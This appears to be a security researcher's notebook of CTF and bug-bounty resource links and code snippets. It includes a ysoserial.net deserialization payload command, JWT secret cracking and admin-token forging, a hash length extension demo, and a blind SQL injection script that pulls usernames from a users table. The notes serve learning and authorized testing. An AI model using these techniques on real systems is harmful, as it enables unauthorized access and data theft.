- [Mono Package for Wine is not installed - Ask Ubuntu](https://askubuntu.com/questions/841847/mono-package-for-wine-is-not-installed)

```console
$ wine uninstaller --list
{9d3fc73f-1cf4-412c-a1c9-d2ad28ccbd62}|||Microsoft .NET Runtime - 6.0.36 (x64)
{8c97cb9f-5366-4851-942a-4da7d5980ee8}|||Microsoft .NET Runtime - 6.0.36 (x86)
{F63B90D5-B273-582F-8DF1-1A1351F6AEBE}|||Wine Mono Runtime
{D26F6A69-D276-54AE-9328-B751F48EE85E}|||Wine Mono Windows Support
```

```bash
wine ~/tools/ysoserial.net/Release/ysoserial.exe -p DotNetNuke -m run_command -c 'echo hello'
```

## Web

- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HTML Standard](https://html.spec.whatwg.org/multipage/)
- [W3Techs](https://w3techs.com/)
- [Temp Mail](https://temp-mail.org/en/)
- [Analyse your HTTP response headers](https://securityheaders.com/)
- [Detecting Security Vulnerabilities in Web Applications Using Dynamic Analysis with Penetration Testing](https://web.archive.org/web/20240318061226/https://owasp.org/www-pdf-archive/OWASP-AppSecEU08-Petukhov.pdf)
- [CS253 - Web Security](https://web.stanford.edu/class/cs253/)
- [Static Badge](https://shields.io/badges/static-badge)
- [regex101](https://regex101.com/)

Webhook Hosting

- [Webhook.site](https://webhook.site/)
- [Interactsh](https://app.interactsh.com/)
- [RequestBin](https://pipedream.com/requestbin)
- [Request Catcher](https://requestcatcher.com/)
- [Beeceptor](https://app.beeceptor.com/login)

### Specification

- [RFC 9110: HTTP Semantics](https://www.rfc-editor.org/rfc/rfc9110.html)
- [RFC 9113: HTTP/2](https://www.rfc-editor.org/rfc/rfc9113.html)

### Vulnerability research approach

#### Taint checking / Taint tracking

- [Taint checking - Wikipedia](https://en.wikipedia.org/wiki/Taint_checking)
- [Taint tracking \| Semgrep](https://semgrep.dev/docs/writing-rules/data-flow/taint-mode/)
- [Ierae seccamp 2023](https://gmo-cybersecurity.com/news/security_camp_presentation_slide_20230912/)
  - [pdf](https://web.archive.org/web/20240405083258/https://ma.ierae.co.jp/asset/94:seccampb6web-pdf)

#### Fuzzing

- [Continuously fuzzing Python C extensions \| Trail of Bits Blog](https://blog.trailofbits.com/2024/02/23/continuously-fuzzing-python-c-extensions/)
- [Todesstern](https://github.com/kleiton0x00/Todesstern) - A simple mutator engine which focuses on finding unknown classes of injection vulnerabilities

### Burp Suite

Generate a PEM Certificate and `curl`

```bash
curl -so ./burp-cert http://127.0.0.1:8080/cert
openssl x509 -inform der -in ./burp-cert -out ./burp-cert.pem

curl --proxy http://127.0.0.1:8080 --cacert ./burp-cert -s https://example.com/
```

### OWASP

- [OWASP Testing Guide v4 Table of Contents](https://wiki.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents)
- [OWASP Top Ten](https://owasp.org/www-project-top-ten/)
- [OWASP Top 10:2021](https://owasp.org/Top10/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

### Training

- [Web Security Academy: Free Online Training from PortSwigger](https://portswigger.net/web-security)
- [All labs | Web Security Academy](https://portswigger.net/web-security/all-labs)
- [Hacksplaining](https://www.hacksplaining.com/lessons)
- [Practise and learn how to solve Capture The Flag challenges](https://www.reddit.com/r/HowToHack/comments/ezp2kv/247ctf_practise_and_learn_how_to_solve_capture/)

### Web Assembly

- [WebAssembly](https://webassembly.org/)
- [WebAssembly \| MDN](https://developer.mozilla.org/en-US/docs/WebAssembly)
- [Wasm By Example - Examples Listing](https://wasmbyexample.dev/all-examples-list)

Basic Concept

- source language (C/C++, Rust, Go, etc...) ->  Wasm
- Wasm is imported by JavaScript, then call exported a function

Compiler / Build Packages

- C/C++: Emscripten: [Main — Emscripten 3.1.49-git (dev) documentation](https://emscripten.org/)
- Rust wasm-pack: [wasm-pack](https://rustwasm.github.io/wasm-pack/)

> Use the compiled WebAssembly…
>
> - [from JavaScript code](https://developer.mozilla.org/en-US/docs/WebAssembly/Loading_and_running)
> - [as a CLI application](https://github.com/bytecodealliance/wasmtime/blob/main/docs/WASI-tutorial.md)
> - [from Node.js (with access to system resources)](https://nodejs.org/api/wasi.html)

### Web API

- [APIsec University – Become an API Security Expert](https://www.apisecuniversity.com/#courses)

### GraphQL

- [GraphQL](https://graphql.org/)
- [How to GraphQL - The Fullstack Tutorial for GraphQL](https://www.howtographql.com/)
- [GraphQL - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [awesome-graphql](https://github.com/chentsulin/awesome-graphql)
- [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - a scripting engine to interact with a graphql endpoint for pentesting purposes

### Json Web Token (JWT)

- [JWT Vulnerabilities (Json Web Tokens) - HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
- [JWT - JSON Web Token - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/JSON%20Web%20Token/)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
  - [jwt_tool Wiki](https://github.com/ticarpi/jwt_tool/wiki)
- [JSON Web Tokens - jwt.io](https://jwt.io/)
- [Hacking JWT Tokens: jku Claim Misuse | by Shivam Bathla | Pentester Academy Blog](https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c)
- [Bug bounty isn’t dying. It’s the future. · rez0](https://rez0.blog/hacking/cybersecurity/2021/01/10/bug-bounty-isnt-dying.html)

#### Cracking with hashcat

```bash
JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I
python3 ~/tools/jwt_tool/jwt_tool.py $JWT
# check: alg = "HS256"

hashcat -m 16500 $JWT /usr/share/wordlists/rockyou.txt --quiet
# output => eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I:catsarethebest

python3 ~/tools/jwt_tool/jwt_tool.py $JWT -I -pc identity -pv admin --sign hs256 -p catsarethebest
# output: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImFkbWluIn0.3xH8a2FskQJ3afYZeJCtwln4CRrwh4nidEy7S6fJoA0
```

### Simple HTTP Server

#### BaseHTTPRequestHandler

```python
from http.server import BaseHTTPRequestHandler
from socketserver import TCPServer

HOST = "0.0.0.0"
PORT = 8000


class RequestHandler(BaseHTTPRequestHandler):
    server_version = "my server 0.0"
    sys_version = ""

    def do_GET(self):
        self.send_response(200)
        self.end_headers()

        print(f"{self.requestline}\n{self.headers}\n")

    def do_POST(self):
        self.send_response(200)
        self.end_headers()

        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8")

        print(f"{self.requestline}\n{self.headers}{body}")


TCPServer.allow_reuse_address = True

with TCPServer((HOST, PORT), RequestHandler) as httpd:
    print(f"Listening {HOST}:{PORT}")
    httpd.serve_forever()
```

- <https://docs.python.org/ja/3/library/http.server.html>
- <https://kazuhira-r.hatenablog.com/entry/2019/08/12/220406>
- <https://github.com/python/cpython/blob/v3.11.4/Lib/http/server.py>

#### Flask

app.py

```python
from flask import Flask

app = Flask(__name__)

@app.route("/")
def index():
    return "test"


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=80)
```

- [Quickstart — Flask Documentation](https://flask.palletsprojects.com/en/stable/quickstart/)

#### RequestBin

Custom Response by each URL path

```python
def handler(pd: "pipedream"):
    if pd.steps["trigger"]["event"]["path"] == "/":
        msg = "foo"
    else:
        msg = "bar"

    pd.respond({
        "status": 200,
        "headers": {
            "Content-Type": "application/json"
        },
        "body": msg,
    })
```

Require Basic Auth

```python
def handler(pd: "pipedream"):
    resp = {
        "status": 401,
        "headers": {
            "WWW-Authenticate": 'Basic realm="my realm"'
        },
        "body":"",
    }
    pd.respond(resp)
```

- [Python](https://pipedream.com/docs/code/python/)
- [Events](https://pipedream.com/docs/workflows/events/#event-format)

### Browser Extension

- [PenTest / BugBounty Firefox Extension Top 14](https://qiita.com/yousukezan/items/6531d5338efa75d41dac)

### RDBMS

server

```bash
# MySQL
docker run --rm --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=password mysql:8-debian

# MariaDB
docker run --rm --name mariadb -p 3306:3306 --env MARIADB_ROOT_PASSWORD=password --env MARIADB_DATABASE=test mariadb:latest
```

client

```bash
mysql --silent -h 127.0.0.1 -u root -ppassword
```

Create Table

```sql
CREATE TABLE tbl1 (
    id int,
    foo varchar(255),
    bar varchar(255)
);
```

- [Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql - Flatt Security Research](https://flatt.tech/research/posts/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql/)
- [CTF-Write-ups/Google CTF/Web/Log-Me-In](https://github.com/csivitu/CTF-Write-ups/tree/master/Google%20CTF/Web/Log-Me-In)

psql client

```text
# connect to databse
psql postgresql://webapp:7UxWFfLpsu4rJA94@127.0.0.1:5432/answers

# https://stackoverflow.com/questions/11180179/postgresql-disable-more-output
\pset pager off

\x
```

#### Install Oracle SQL*Plus DB client

<https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-pentesting-requirements-installation>

```bat
export PATH=$PATH:/opt/oracle/instantclient_21_7
export SQLPATH=/opt/oracle/instantclient_21_7
export TNS_ADMIN=/opt/oracle/instantclient_21_7
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_7
export ORACLE_HOME=/opt/oracle/instantclient_21_7
```

### Web Archiver

- [Webpage archive](https://archive.md/)

### Python Flask

SSTI Testing setup

```python
from flask import Flask, request, render_template_string
app = Flask("myapp")
def test(p):
    with app.test_request_context():
        request.args.a = "a"
        print(render_template_string(p))
```

### Service Worker

- [Service Worker の概要  \|  Workbox  \|  Chrome for Developers](https://developer.chrome.com/docs/workbox/service-worker-overview?hl=ja)
- [Workbox  \|  Chrome for Developers](https://developer.chrome.com/docs/workbox?hl=ja)

### Web Browser

#### Document

- [Design Documents](https://www.chromium.org/developers/design-documents/)
- [Inside look at modern web browser (part 1)  \|  Blog  \|  Chrome for Developers](https://developer.chrome.com/blog/inside-browser-part1/)

#### Bookmarklet

- [Bookmarklet Creator with Script Includer - Peter Coles](https://mrcoles.com/bookmarklet/)

copy markdown format

```javascript
let title = document.title.replace(/\[/g, '\\[').replace(/]/g, '\\]').replace(/\|/g, '\\|');
let link = document.URL.replace(/\(/g, '%2528').replace(/\)/g, '%2529');
let md = `- [${title}](${link})`;

setTimeout(() => navigator.clipboard.writeText(md), 100);
```

copy markdown format and description

```javascript
let title = document.title.replace(/\[/g, '\\[').replace(/]/g, '\\]').replace(/\|/g, '\\|');
let link = document.URL.replace(/\(/g, '%2528').replace(/\)/g, '%2529');
let md = `- [${title}](${link})`;

let description = document.querySelector('meta[name="description" i]')?.content;
if (description) md += ` - ${description}`;

setTimeout(() => navigator.clipboard.writeText(md), 100);
```

multiple search engine

```javascript
// Check `Sites can send pop-ups and use redirects` in chrome://settings/content/popups

const o = prompt('query: ', '');
const engines = [
  'https://searx.juancord.xyz/searxng/search?q=%s',
  'https://stract.com/search?q=%s',
  'https://yandex.com/search/?text=%s',
  'https://www.bing.com/search?q=%s',
  'https://www.google.com/search?lr=lang_en&q=%s',
  'https://www.google.com/search?lr=lang_ja&q=%s',
  'https://duckduckgo.com/?kl=us-en&q=%s',
  'https://duckduckgo.com/?kl=jp-jp&q=%s',
];
engines.forEach(function (e) { window.open(e.replace('%s', encodeURIComponent(o))); });
```

- [How To Use URL Parameters To Change Your DuckDuckGo Search Settings \| DuckDuckGo Help Pages](https://duckduckgo.com/duckduckgo-help-pages/settings/params/)

### XMPP

XMPP client

- [XMPP \| XMPP Software](https://xmpp.org/software/?platform=linux)
- [Psi](https://github.com/psi-im/psi)
- [Converse.js](https://xmpp.org/software/converse-js/)
- [MCabber Homepage](https://lilotux.net/~mikael/mcabber/)

### Web application frameworks benchmark

- [Round 15 results - TechEmpower Framework Benchmarks](https://www.techempower.com/benchmarks/)

## Crypto

- [CryptoHack - A fun, free platform for learning cryptography](https://cryptohack.org/)
- [The Cryptopals Crypto Challenges](https://cryptopals.com/)
- [Boneh Publications: Twenty years of attacks on the RSA cryptosystem](https://crypto.stanford.edu/~dabo/abstracts/RSAattack-survey.html)
- [RSA暗号運用でやってはいけない n のこと #ssmjp](https://www.slideshare.net/sonickun/rsa-n-ssmjp)
- [quipqiup - cryptoquip and cryptogram solver](https://www.quipqiup.com/)
- [Vigenere Solver - www.guballa.de](https://www.guballa.de/vigenere-solver)
- [Modular conversion, encoding and encryption online — Cryptii](https://cryptii.com/)
- [dCode - Solvers, Ciphers, Calculators, Decoders, Online](https://www.dcode.fr/en)
- [NIST SP 800-38A, Recommendation for Block Cipher Modes of Operation Methods and Techniques](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf)
- [CBC byte flipping attack—101 approach \| Infosec](https://resources.infosecinstitute.com/topics/hacking/cbc-byte-flipping-attack-101-approach/)
- [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)
- [Prime Factors Calculator](https://www.random-science-tools.com/maths/prime-factors.htm)
- [factordb](http://www.factordb.com/)

RSA

- [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) - RSA attack tool (mainly for ctf)
- [RFC3447 Public-Key Cryptography Standards (PKCS) #1: RSA Cryptography](https://www.ietf.org/rfc/rfc3447.txt)
- [CTF crypto 逆引き - ふるつき](https://furutsuki.hatenablog.com/entry/2021/03/16/095021)
- [RSA暗号](https://www.komazawa-u.ac.jp/~w3c/lecture/RSA%E6%9A%97%E5%8F%B7.pdf)

### Hash Length Extension

- [Hash Length Extension Attack - HackTricks](https://book.hacktricks.xyz/crypto-and-stego/hash-length-extension-attack)
- [hash_extender](https://github.com/iagox86/hash_extender)

Tested

```console
$ secret=$(hexdump -vn16 -e'4/4 "%08x" 1 "\n"' /dev/urandom)

$ echo -n "${secret}" | hd
00000000  30 35 64 32 33 35 37 30  33 61 63 36 33 36 33 61  |05d235703ac6363a|
00000010  35 61 64 65 63 32 32 37  32 66 36 32 64 61 65 34  |5adec2272f62dae4|
00000020

$ echo -n "${secret}data" | sha256sum
38d77dfacdbe32fd4e62ea173d0ae4cd7e80c7aa3fcf3d0f9b4febdb66d3ef81  -

$ ~/tools/hash_extender/hash_extender --signature 38d77dfacdbe32fd4e62ea173d0ae4cd7e80c7aa3fcf3d0f9b4febdb66d3ef81 -l 32 --data data --append appenddata --format sha256
Type: sha256
Secret length: 32
New signature: 4cb4e368d4d703314d274f9f5774853eea9044be70b92fbe5905749ae11de4e4
New string: 6461746180000000000000000000000000000000000000000000000000000120617070656e6464617461


$ newstr=$(echo -n 6461746180000000000000000000000000000000000000000000000000000120617070656e6464617461 | xxd -r -p)

$ echo -n "${secret}${newstr}" | sha256sum
4cb4e368d4d703314d274f9f5774853eea9044be70b92fbe5905749ae11de4e4  -
```

### oneliner

```python
gcd = lambda a, b: b if (a:=a%b) == 0 else gcd(b, a)
```

### knonw plaintext attack

- [bkcrack](https://github.com/kimci86/bkcrack) - Crack legacy zip encryption with Biham and Kocher's known plaintext attack

## Forensics

### Steganography

- [StegOnline](https://stegonline.georgeom.net/upload)
- [Steganography - A list of useful tools and resources - 0xRick’s Blog](https://0xrick.github.io/lists/stego/)
- [corkami/pics](https://github.com/corkami/pics)
- [File Signatures](https://www.garykessler.net/library/file_sigs.html)
- [List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
- [Aperi'Solve](https://www.aperisolve.com/)
- [stegsee](https://github.com/RickdeJager/stegseek)
- [Binwalk](https://github.com/ReFirmLabs/binwalk)
- [pngcheck](http://www.libpng.org/pub/png/apps/pngcheck.html)
- [stegsolve](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install)

### DFIR

- [Challenges & CTFs - AboutDFIR - The Definitive Compendium Project](https://aboutdfir.com/education/challenges-ctfs/)
- [MalwareTech - Everything Cyber Security](https://www.malwaretech.com/)
- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [Cisco Talos Intelligence Group - Comprehensive Threat Intelligence](https://www.talosintelligence.com/)
- [Zero2Automated](https://courses.zero2auto.com/)
- [autopsy](https://github.com/sleuthkit/autopsy)
- [FTK Imager](https://www.exterro.com/digital-forensics-software/ftk-imager)
- [CFReDS Portal](https://cfreds.nist.gov/)
- [Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md)

Malware

- [rshipp/awesome-malware-analysis](https://github.com/rshipp/awesome-malware-analysis)
- [Maldev Academy](https://maldevacademy.com/)
- [ANY.RUN](https://any.run/)

Malware sample

- [MalwareBazaar \| Malware sample exchange](https://bazaar.abuse.ch/)
- [MalShare](https://malshare.com/)

Report

- [The DFIR Report](https://thedfirreport.com/)
- [Research \| Trellix Stories](https://www.trellix.com/blogs/research/)

### Memory

#### Volatility

- [volatility3](https://github.com/volatilityfoundation/volatility3)
- [Volatility Foundation](https://volatilityfoundation.org/)
- [OpenSSH-Session-Key-Recovery](https://github.com/fox-it/OpenSSH-Session-Key-Recovery) - Project containing several tools/ scripts to recover the OpenSSH session keys used to encrypt/ decrypt SSH traffic
- [dockerfile-volatility](https://github.com/phocean/dockerfile-volatility) - Dockerfile to build a Docker image of the DFIR Volatility memory analysis framework

### Other

- [Thumbcache Viewer](https://thumbcacheviewer.github.io/) - Extract thumbnail images from the thumbcache_*.db and iconcache_*.db database files.

## Networking

- [Wireshark User’s Guide](https://www.wireshark.org/docs/wsug_html_chunked/)
- [endtoend.pdf](http://web.mit.edu/Saltzer/www/publications/endtoend/endtoend.pdf)
- [End-to-end principle - Wikipedia](https://en.wikipedia.org/wiki/End-to-end_principle)
- [3 Minutes Networking](https://www5e.biglobe.ne.jp/aji/3min/)

### SSL/TLS

- [TLS暗号設定ガイドライン　安全なウェブサイトのために（暗号設定対策編） \| 情報セキュリティ \| IPA 独立行政法人 情報処理推進機構](https://www.ipa.go.jp/security/crypto/guideline/ssl_crypt_config.html)
  - [TLS 暗号設定 ガイドライン](https://www.ipa.go.jp/security/crypto/guideline/gmcbt80000005ufv-att/ipa-cryptrec-gl-3001-3.0.1.pdf)

### openssl

s_client subcommand

```bash
# basic connect
openssl s_client -connect example.com:443

# -trace option: show TLS record and a parsed Certificate
openssl s_client -connect example.com:443 -trace

# input empty HTTP request using /dev/null
openssl s_client -connect example.com:443 -trace < /dev/null
```

x509 subcommand

```bash
# parse a Certificate
openssl x509 -in example.com.pem -noout -text

# output Subject only
openssl x509 -in example.com.cert -noout -subject
# => subject=C=US, ST=California, L=Los Angeles, O=Internet Corporation for Assigned Names and Numbers, CN=www.example.org

# output Issuer only
openssl x509 -in example.com.cert -noout -issuer
# => issuer=C=US, O=DigiCert Inc, CN=DigiCert Global G2 TLS RSA SHA256 2020 CA1

# output Validity only
openssl x509 -in example.com.cert -noout -dates
# => notBefore=Jan 30 00:00:00 2024 GMT
# => notAfter=Mar  1 23:59:59 2025 GMT

# PEM to DER
openssl x509 -in example.com.pem -inform pem -outform der | hd
openssl x509 -in example.com.pem -inform pem -outform der -out example.com.der  # save as a file

# DER to PEM
openssl x509 -in example.com.der -inform der -outform pem
```

see details for X.509: [RFC 5280: Section 4 Certificate and Certificate Extensions Profile](https://www.rfc-editor.org/rfc/rfc5280.html#section-4)

verify subcommand

```bash
openssl verify -CAfile <ca_certificate.pem> <certificate.pem>
```

rsa subcommand

```bash
openssl rsa -in
```

create self-certificate

```bash
openssl req -x509 -newkey rsa:4096 -noenc -out cert.pem -keyout key.pem -days 365 -subj /CN=example.com
```

## OSINT

- [OSINT Framework](https://osintframework.com/)
- [Google Dorks – We are OSINTCurio.us](https://osintcurio.us/2019/12/20/google-dorks/)
- [OSINT Dojo](https://www.osintdojo.com/)
- [email2phonenumber](https://github.com/martinvigo/email2phonenumber)
- [sherlock](https://github.com/sherlock-project/sherlock)
- [Web-Check](https://github.com/Lissy93/web-check)
- [WhatsMyName Web](https://whatsmyname.app/)

## Game Hacking

- [Guided Hacking - Learn Reverse Engineering & Game Hacking](https://guidedhacking.com/)

## Wi-Fi

- [Pentesting Wifi \| HackTricks \| HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi)
- [wiire-a/pixiewps: An offline Wi-Fi Protected Setup brute-force utility](https://github.com/wiire-a/pixiewps)
- [Wifi Hacking Tutorials](https://www.hackingtutorials.org/category/wifi-hacking-tutorials/)
- [WPS PIN attacks: How to crack WPS-enabled Wi-Fi networks with Reaver](https://www.hackthebox.com/blog/wps-pin-attacks-and-cracking-wps-with-reaver)
- [Hack The Box :: Hack The Box](https://app.hackthebox.com/machines/Wifinetic)
- [Brute forcing Wi-Fi Protected Setup by Stefan Viehböck in 2011](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf)

Tools

- [t6x/reaver-wps-fork-t6x](https://github.com/t6x/reaver-wps-fork-t6x)

## GitHub

### Dork

- [How to exclude user repository or organization repository from a search? · community · Discussion #23318](https://github.com/orgs/community/discussions/23318)
  - GitHub Code Search Exclude. e.g. `-repo:github/git-msysgit -user:4n86rakam1`

### GraphQL API: Query Example

- [Objects - GitHub Docs](https://docs.github.com/en/graphql/reference/objects)
- Explorer shortcut: Alt + 0 (Completion)
- [Explorer - GitHub Docs](https://docs.github.com/en/graphql/overview/explorer)

```graphql
{
  topic(name: "php") {
    repositories(first: 50, orderBy: {direction: DESC, field: STARGAZERS}) {
    nodes {
        name
        url
        stargazerCount
      }
    }
  }
}
```

```graphql
{
  topic(name: "php") {
    repositories(
      first: 10
      after: null
      orderBy: {direction: DESC, field: STARGAZERS}
    ) {
      nodes {
        nameWithOwner
        url
        stargazerCount
      }
      pageInfo {
        endCursor
        startCursor
        hasNextPage
        hasPreviousPage
      }
    }
  }
}
```

```graphql
{
  search(
    query: "language:PHP stars:>10000 archived:no"
    type: REPOSITORY
    first: 10
  ) {
    edges {
      node {
        ... on Repository {
          nameWithOwner
          stargazerCount
          url
          isArchived
        }
      }
    }
  }
}
```

Pagenation

- [Requesting a cursor in your query](https://docs.github.com/en/graphql/guides/using-pagination-in-the-graphql-api#requesting-a-cursor-in-your-query)

## Bug Bounty

### Platform

- [Intigriti](https://app.intigriti.com/researcher/dashboard)
- [HackerOne](https://hackerone.com/)
- [Bugcrowd](https://bugcrowd.com/)
- [Open Bug Bounty](https://www.openbugbounty.org/)
- [YesWeHack](https://www.yeswehack.com/)
- [Crowdfense](https://www.crowdfense.com/)
- [ZERODIUM](https://zerodium.com/)

### Available Programs

- [Microsoft Bounty Programs \| MSRC](https://www.microsoft.com/en-us/msrc/bounty) - Microsoft offers cash awards for finding and reporting certain types of vulnerabilities and exploitation techniques

### Curated

- [awesome-bug-bounty](https://github.com/djadmin/awesome-bug-bounty) - A comprehensive curated list of available Bug Bounty & Disclosure Programs and Write-ups.

### Getting Started / Tutorials

- [How To Do Your Reconnaissance Properly Before Chasing A Bug Bounty \| by Hussnain Fareed \| InfoSec Write-ups](https://infosecwriteups.com/guide-to-basic-recon-bug-bounties-recon-728c5242a115)
  - [archive](https://megalodon.jp/2023-0326-1047-26/https://infosecwriteups.com:443/guide-to-basic-recon-bug-bounties-recon-728c5242a115)
- [jhaddix/tbhm](https://github.com/jhaddix/tbhm) - The Bug Hunters Methodology
- [daffainfo/AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) - All about bug bounty (bypasses, payloads, and etc)
- [Penetration Testing and Bug-Bounty Hunting](https://www.billdietrich.me/PenetrationTestingAndBugBountyHunting.html)
- [Beginners Resources](https://rhynorater.github.io/Beginners-Resources) - Where to get started in bug bounty
- [Bug Bounty Forum](https://bugbountyforum.com/) - Bug Bounty Forum is a 150+ large community of security researchers sharing information with each other.

<details><summary>Hacker101 Discord Server > #faq channel: <https://discord.com/channels/514337135491416065/555093365742501928/717413712096657539></summary>

> How to get started with hacking and bug bounties?
>
> We've gathered some useful resources to get your started on your bug bounty journey!
>
> - Guide to learn hacking <https://www.youtube.com/watch?v=2TofunAI6fU>
> - Finding your first bug <https://portswigger.net/blog/finding-your-first-bug-bounty-hunting-tips-from-the-burp-suite-community>
> - Port Swigger Web Security Academy <https://portswigger.net/web-security/learning-path>
> - Nahamsec's Twitch <https://www.twitch.tv/nahamsec>
> - Nahamsec interviews with top bug bounty hunters <https://www.youtube.com/c/Nahamsec>
> - Nahamsec's beginner repo <https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters>
> - Stök <https://www.youtube.com/c/STOKfredrik>
> - InsiderPhD <https://www.youtube.com/c/InsiderPhD>
>   - Series for new bug hunters <https://www.youtube.com/playlist?list=PLbyncTkpno5FAC0DJYuJrEqHSMdudEffw>
> - Jhaddix <https://www.youtube.com/c/jhaddix>
> - Posts from Hacker101 members on how to get started hacking
>   - zonduu <https://medium.com/@zonduu/bug-bounty-beginners-guide-683e9d567b9f>
>   - p4nda <https://enfinlay.github.io/bugbounty/2020/08/15/so-you-wanna-hack.html>
>     - also a blog on subdomain takeovers <https://enfinlay.github.io/sto/ip/domain/bugbounty/2020/09/12/ip-server-domain.html>
>   - clos2100 on getting started without a technical background <https://twitter.com/pirateducky/status/1300566000665014275>
>   - al-madjus from 0 to bug hunter <https://klarsen.net/uncategorized/from-0-to-bug-hunter-my-journey/>
> - dee-see's resources for Android Hacking <https://blog.deesee.xyz/android/security/2020/01/13/android-application-hacking-resources.html>
> - hacker101 videos <https://www.hacker101.com/videos>
>
> The ⁠questions-and-answers and ⁠hacking-resources channels have great resources in the pinned messages that will help you get started. You will find there all sorts of things to help you learn and progress.

</details>

### Writeup

- [ngalongc/bug-bounty-reference](https://github.com/ngalongc/bug-bounty-reference)
- [fardeen-ahmed/Bug-bounty-Writeups](https://github.com/fardeen-ahmed/Bug-bounty-Writeups)
- [Writeups - Pentester Land](https://pentester.land/writeups/)
- [InfoSec Write-ups](https://infosecwriteups.com/)
- <https://www.google.com/search?q=bug+bounty+writeup&tbs=qdr:m>

### Blog

- [バグバウンティ \| クラウド型Webセキュリティ診断ツール - Securify](https://www.securify.jp/blog/?tag=bug-bounty)
- [【バグハンターインタビュー】PentesterLand \| クラウド型Webセキュリティ診断ツール - Securify](https://www.securify.jp/blog/bug-business-10-get-to-know-intigriti-content-creator-pentesterland/)

### Tools

- [bbscope](https://github.com/sw33tLie/bbscope) - Scope gathering tool for HackerOne, Bugcrowd, Intigriti, YesWeHack, and Immunefi!

### Other

- [arkadiyt/bounty-targets-data/](https://github.com/arkadiyt/bounty-targets-data/)
- [2017年LINE Security Bug Bounty Programの結果について - LINE ENGINEERING](https://engineering.linecorp.com/ja/blog/detail/255/)
  - [archive](https://web.archive.org/web/20210619223511/https://engineering.linecorp.com/ja/blog/detail/255/)

## Code Snippets

```bash
# show pydoc
python3 -m pydoc requests
python3 -m pydoc requests.Response
```

datetime

```python
# now to epoch
from datetime import datetime
datetime.now().strftime('%s')
# output => '1700187759'

# fromisoformat
datetime.fromisoformat('2023-11-17T11:25:24+00:00')
datetime.fromisoformat('2023-11-17T11:25:24+09:00')
```

string, hex

```python
import binascii

binascii.hexlify(b'abcd')
# => b'61626364'

int(b'61626364', base=16)
# => 1633837924

binascii.unhexlify(hex(1633837924)[2:])
# => b'abcd'

# bytes string to hex string
b"deadbeef".hex()
# => '6465616462656566'
```

base solver.py template

```python
import requests

requests.packages.urllib3.disable_warnings()
s = requests.Session()
# s.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
s.verify = False

BASE_URL = "https://localhost:8000"


def main():
    pass


if __name__ == "__main__":
    main()
```

SQLi with binary search

```python
def binary_search_leftmost(l, r, payload_with_m):
    def is_true(payload):
        res = s.get(f"{BASE_URL}/", params={"order": payload})

        return "Question count" in res.text

    while l < r:
        m = (l + r) // 2
        print(f"[*] Searching in range ({l}, {r}): midpoint = {m}    ", end="\r", flush=True)
        if is_true(payload_with_m.format(m=m)):
            l = m + 1
        else:
            r = m

    return l

def main():
    # get user id
    user_id = binary_search_leftmost(
        0,
        100000,
        f"name LIMIT (CASE WHEN ((SELECT id FROM users WHERE isadmin=false and ismod=true LIMIT 1) > {{m}}) THEN 1 ELSE 0 END)--",
    )

    # get username
    length = binary_search_leftmost(
        0,
        100000,
        f"name LIMIT (CASE WHEN (LENGTH((SELECT username FROM users WHERE id={user_id})) > {{m}}) THEN 1 ELSE 0 END)--",
    )

    username = ""
    for i in range(length):
        ret = binary_search_leftmost(
            0x20,
            0x7E,
            f"name LIMIT (CASE WHEN (ASCII(SUBSTRING((SELECT username FROM users WHERE id = {user_id} LIMIT 1), {i+1}, 1)) > {{m}}) THEN 1 ELSE 0 END)--",
        )
        username += chr(ret)
```

ThreadPoolExecuter

```python
with ThreadPoolExecutor(max_workers=10) as executor:
    for i in range(46135, 99999):
        future = executor.submit(join_group, i)
        if res := future.result():
            executor.shutdown()
            return res
```

requests

```python
import requests

# session
s = requests.Session()

# https://requests.readthedocs.io/en/latest/api/#requests.Session.cookies
# https://requests.readthedocs.io/en/latest/api/#requests.cookies.RequestsCookieJar

# set cookie
s.cookies.update({"token": foobar})

# clear cookie
s.cookies.clear()

# post file
s.post(
    f"{BASE_URL}/actions/contact.php",
    files={"image": ("test.jpg", open("xss.jpg", "rb"), "image/jpeg")},
)

# post empty file
s.post(
    f"{BASE_URL}/actions/contact.php",
    files={"image": ("test.jpg", b"")},
)
```

HTTP Listener for XSS with Event threading

